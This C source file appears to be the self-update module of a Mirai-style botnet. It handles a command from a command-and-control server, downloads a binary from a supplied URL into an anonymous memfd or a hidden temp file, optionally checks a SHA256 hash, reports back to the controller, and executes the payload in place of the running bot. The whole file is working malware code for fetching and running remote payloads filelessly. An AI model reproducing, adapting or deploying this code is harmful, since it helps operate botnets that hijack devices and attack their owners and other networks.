#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#include "headers/includes.h"
#include "headers/protocol.h"
#include "headers/update.h"
#include "headers/cnc.h"
#include "headers/resolv.h"
#include "headers/table.h"
#include "headers/util.h"
#include "headers/rand.h"
#include "headers/sha256.h"

extern int fd_ctrl;
extern int fd_serv;

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#ifndef __NR_memfd_create
#if defined(__x86_64__)
#define __NR_memfd_create 319
#elif defined(__i386__)
#define __NR_memfd_create 356
#elif defined(__arm__)
#define __NR_memfd_create 385
#elif defined(__aarch64__)
#define __NR_memfd_create 279
#elif defined(__mips__) && defined(__ABIO32__)
#define __NR_memfd_create 4354
#elif defined(__mips__) && defined(__mips64)
#define __NR_memfd_create 5314
#elif defined(__powerpc__)
#define __NR_memfd_create 360
#elif defined(__sh__)
#define __NR_memfd_create 385
#endif
#endif

static char update_bot_id[CNC_ID_MAX_LEN + 1];

typedef struct {
    char url[CNC_UPDATE_URL_MAX + 1];
    uint8_t min_version;
    uint8_t force;
    uint8_t hash_len;
    uint8_t hash[CNC_UPDATE_HASH_SHA256];
} update_cmd_t;

void update_set_bot_id(const char *id)
{
    util_zero(update_bot_id, sizeof(update_bot_id));
    if (id != NULL && id[0] != 0)
        util_strcpy(update_bot_id, (char *)id);
}

const char *update_get_bot_id(void)
{
    return update_bot_id;
}

static BOOL update_parse(char *buf, int len, update_cmd_t *cmd)
{
    uint8_t url_len;
    int off;

    if (!buf || !cmd || len < 3)
        return FALSE;

    util_zero(cmd, sizeof(*cmd));

    url_len = (uint8_t)buf[0];
    if (url_len == 0 || url_len > CNC_UPDATE_URL_MAX)
        return FALSE;
    if (len < 1 + url_len + 2)
        return FALSE;

    util_memcpy(cmd->url, buf + 1, url_len);
    cmd->url[url_len] = 0;

    off = 1 + url_len;
    cmd->min_version = (uint8_t)buf[off++];
    cmd->force = (uint8_t)buf[off++];

    if (off < len)
    {
        cmd->hash_len = (uint8_t)buf[off++];
        if (cmd->hash_len > CNC_UPDATE_HASH_SHA256)
            return FALSE;
        if (cmd->hash_len > 0)
        {
            if (off + cmd->hash_len > len)
                return FALSE;
            util_memcpy(cmd->hash, buf + off, cmd->hash_len);
        }
    }

    return TRUE;
}

static BOOL update_should_run(const update_cmd_t *cmd)
{
    if (cmd->force)
        return TRUE;
    return cnc_get_bot_version() < cmd->min_version;
}

static BOOL update_is_digit(char c)
{
    return c >= '0' && c <= '9';
}

static BOOL update_parse_url(const char *url, char *host, int host_sz, uint16_t *port,
                             char *path, int path_sz)
{
    const char *p;
    int host_len, path_len;

    if (!url || util_strncmp((char *)url, "http://", 7))
        return FALSE;

    p = url + 7;
    host_len = 0;

    while (*p != 0 && *p != ':' && *p != '/')
    {
        if (host_len + 1 >= host_sz)
            return FALSE;
        host[host_len++] = *p++;
    }
    host[host_len] = 0;

    if (host_len == 0)
        return FALSE;

    *port = htons(80);
    if (*p == ':')
    {
        uint32_t port_val = 0;

        p++;
        while (update_is_digit(*p))
            port_val = port_val * 10 + (uint32_t)(*p++ - '0');
        if (port_val == 0 || port_val > 65535)
            return FALSE;
        *port = htons((uint16_t)port_val);
    }

    if (*p == 0)
        util_strcpy(path, (char *)"/");
    else
    {
        path_len = util_strlen((char *)p);
        if (path_len + 1 >= path_sz)
            return FALSE;
        util_strcpy(path, (char *)p);
    }

    return TRUE;
}

static BOOL update_host_to_addr(const char *host, ipv4_t *addr)
{
    struct resolv_entries *entries;
    uint32_t parsed;

    parsed = inet_addr(host);
    if (parsed != INADDR_NONE)
    {
        *addr = parsed;
        return TRUE;
    }

    entries = resolv_lookup((char *)host);
    if (entries == NULL || entries->addrs_len == 0)
    {
        if (entries != NULL)
            resolv_entries_free(entries);
        return FALSE;
    }

    *addr = entries->addrs[0];
    resolv_entries_free(entries);
    return TRUE;
}

static int update_connect_http(const char *host, uint16_t port)
{
    struct sockaddr_in addr;
    ipv4_t ip;
    int fd;

    if (!update_host_to_addr(host, &ip))
        return -1;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1)
        return -1;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = port;

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        close(fd);
        return -1;
    }

    return fd;
}

static int update_send_all(int fd, const char *buf, int len)
{
    int sent = 0;

    while (sent < len)
    {
        ssize_t n = send(fd, buf + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0)
            return -1;
        sent += (int)n;
    }
    return sent;
}

static int update_find_header_end(char *buf, int len)
{
    int i;

    for (i = 0; i + 3 < len; i++)
    {
        if (buf[i] == '\r' && buf[i + 1] == '\n' && buf[i + 2] == '\r' && buf[i + 3] == '\n')
            return i + 4;
    }
    return -1;
}

static int update_parse_content_length(char *hdr, int hdr_len)
{
    char *p = hdr;
    char *end = hdr + hdr_len;

    while (p + 14 < end)
    {
        if ((p[0] == 'C' || p[0] == 'c') &&
            (p[1] == 'o' || p[1] == 'O') &&
            (p[2] == 'n' || p[2] == 'N') &&
            (p[3] == 't' || p[3] == 'T') &&
            (p[4] == 'e' || p[4] == 'E') &&
            (p[5] == 'n' || p[5] == 'N') &&
            (p[6] == 't' || p[6] == 'T') &&
            p[7] == '-' &&
            (p[8] == 'l' || p[8] == 'L') &&
            (p[9] == 'e' || p[9] == 'E') &&
            (p[10] == 'n' || p[10] == 'N') &&
            (p[11] == 'g' || p[11] == 'G') &&
            (p[12] == 't' || p[12] == 'T') &&
            (p[13] == 'h' || p[13] == 'H') &&
            p[14] == ':')
        {
            int val = 0;

            p += 15;
            while (p < end && (*p == ' ' || *p == '\t'))
                p++;
            while (p < end && update_is_digit(*p))
                val = val * 10 + (*p++ - '0');
            return val;
        }
        p++;
    }

    return -1;
}

static BOOL update_http_download_fd(const char *url, int out_fd, int *out_size, sha256_ctx *hash_ctx)
{
    char host[256], path[512], req[768];
    char accum[8192], buf[4096];
    uint16_t port;
    int fd, hdr_end, content_len, body_written = 0, accum_len = 0, n;

    if (!update_parse_url(url, host, sizeof(host), &port, path, sizeof(path)))
        return FALSE;

    fd = update_connect_http(host, port);
    if (fd == -1)
        return FALSE;

    util_zero(req, sizeof(req));
    util_strcpy(req, "GET ");
    util_strcpy(req + util_strlen(req), path);
    util_strcpy(req + util_strlen(req), " HTTP/1.1\r\nHost: ");
    util_strcpy(req + util_strlen(req), host);
    util_strcpy(req + util_strlen(req), "\r\nConnection: close\r\n\r\n");

    if (update_send_all(fd, req, util_strlen(req)) == -1)
    {
        close(fd);
        return FALSE;
    }

    hdr_end = -1;
    content_len = -1;

    while ((n = (int)recv(fd, buf, sizeof(buf), 0)) > 0)
    {
        if (hdr_end == -1)
        {
            if (accum_len + n > (int)sizeof(accum))
                break;

            util_memcpy(accum + accum_len, buf, n);
            accum_len += n;
            hdr_end = update_find_header_end(accum, accum_len);
            if (hdr_end == -1)
                continue;

            content_len = update_parse_content_length(accum, hdr_end);
            n = accum_len - hdr_end;
            if (n > 0)
            {
                if (body_written + n > CNC_UPDATE_MAX_BYTES)
                    break;
                sha256_update(hash_ctx, (uint8_t *)(accum + hdr_end), (uint32_t)n);
                write(out_fd, accum + hdr_end, n);
                body_written += n;
            }
            continue;
        }

        if (body_written + n > CNC_UPDATE_MAX_BYTES)
            break;

        sha256_update(hash_ctx, (uint8_t *)buf, (uint32_t)n);
        write(out_fd, buf, n);
        body_written += n;
        if (content_len > 0 && body_written >= content_len)
            break;
    }

    close(fd);

    if (body_written <= 0)
        return FALSE;

    if (out_size != NULL)
        *out_size = body_written;

    return TRUE;
}

static int update_open_memfd(void)
{
#ifdef __NR_memfd_create
    return (int)syscall(__NR_memfd_create, "", MFD_CLOEXEC);
#else
    return -1;
#endif
}

static BOOL update_build_path(char *path, int path_sz)
{
    char *base;
    int base_len;
    uint32_t rnd;

    table_unlock_val(TABLE_KILLER_VAR_TMP);
    base = table_retrieve_val(TABLE_KILLER_VAR_TMP, &base_len);
    if (base == NULL || base_len <= 0 || base_len + 20 >= path_sz)
    {
        table_lock_val(TABLE_KILLER_VAR_TMP);
        return FALSE;
    }

    util_memcpy(path, base, base_len);
    path[base_len] = '/';
    path[base_len + 1] = '.';
    path[base_len + 2] = 'r';
    path[base_len + 3] = 'n';
    rnd = rand_next();
    util_itoa((int)(rnd & 0xffff), 16, path + base_len + 4);
    util_itoa((int)((rnd >> 16) & 0xffff), 16, path + base_len + 4 + util_strlen(path + base_len + 4));
    table_lock_val(TABLE_KILLER_VAR_TMP);
    return TRUE;
}

static BOOL update_verify_hash(const update_cmd_t *cmd, const uint8_t *digest)
{
    int i;

    if (cmd->hash_len == 0)
        return TRUE;
    if (cmd->hash_len != CNC_UPDATE_HASH_SHA256)
        return FALSE;

    for (i = 0; i < CNC_UPDATE_HASH_SHA256; i++)
    {
        if (digest[i] != cmd->hash[i])
            return FALSE;
    }
    return TRUE;
}

static void update_exec_from_fd(int bin_fd, const char *path_fallback)
{
    char fd_path[64];
    char *argv[3];

    argv[0] = (char *)"reflect";
    if (update_bot_id[0] != 0)
    {
        argv[1] = update_bot_id;
        argv[2] = NULL;
    }
    else
    {
        argv[1] = NULL;
    }

    if (path_fallback != NULL)
        argv[0] = (char *)path_fallback;

    if (path_fallback == NULL)
    {
        util_zero(fd_path, sizeof(fd_path));
        util_strcpy(fd_path, "/proc/self/fd/");
        util_itoa(bin_fd, 10, fd_path + util_strlen(fd_path));
        argv[0] = fd_path;
    }

    execve(argv[0], argv, NULL);
}

static void update_child_run(const update_cmd_t *cmd)
{
    sha256_ctx hash_ctx;
    uint8_t digest[CNC_UPDATE_HASH_SHA256];
    int bin_fd = -1, body_size = 0;
    char path[64];
    BOOL used_memfd = FALSE;

    bin_fd = update_open_memfd();
    if (bin_fd != -1)
        used_memfd = TRUE;
    else if (!update_build_path(path, sizeof(path)))
        _exit(1);
    else
        bin_fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0700);

    if (bin_fd == -1)
        _exit(1);

    sha256_init(&hash_ctx);
    if (!update_http_download_fd(cmd->url, bin_fd, &body_size, &hash_ctx))
    {
        close(bin_fd);
        if (!used_memfd)
            unlink(path);
        cnc_send_ack(fd_serv, CNC_OP_UPDATE, CNC_ACK_FAIL);
        _exit(1);
    }

    sha256_final(&hash_ctx, digest);
    if (!update_verify_hash(cmd, digest))
    {
#ifdef DEBUG
        printf("[update] SHA256 mismatch\n");
#endif
        close(bin_fd);
        if (!used_memfd)
            unlink(path);
        cnc_send_ack(fd_serv, CNC_OP_UPDATE, CNC_ACK_FAIL);
        _exit(1);
    }

    if (lseek(bin_fd, 0, SEEK_SET) == -1)
    {
        close(bin_fd);
        if (!used_memfd)
            unlink(path);
        cnc_send_ack(fd_serv, CNC_OP_UPDATE, CNC_ACK_FAIL);
        _exit(1);
    }

    cnc_send_ack(fd_serv, CNC_OP_UPDATE, CNC_ACK_OK);

    if (fd_ctrl != -1)
        close(fd_ctrl);
    if (fd_serv != -1)
        close(fd_serv);

#ifdef DEBUG
    printf("[update] launching payload (%d bytes, memfd=%d)\n", body_size, used_memfd);
#endif

    if (used_memfd)
        update_exec_from_fd(bin_fd, NULL);
    else
        update_exec_from_fd(bin_fd, path);

    close(bin_fd);
    if (!used_memfd)
        unlink(path);
    _exit(1);
}

void update_handle(char *buf, int len)
{
    update_cmd_t cmd;
    pid_t pid;

    if (!update_parse(buf, len, &cmd))
        return;

    if (!update_should_run(&cmd))
    {
#ifdef DEBUG
        printf("[update] skipped (ver=%u min=%u force=%u)\n",
               (unsigned)cnc_get_bot_version(), (unsigned)cmd.min_version, (unsigned)cmd.force);
#endif
        return;
    }

    pid = fork();
    if (pid < 0)
        return;
    if (pid > 0)
        return;

    update_child_run(&cmd);
}
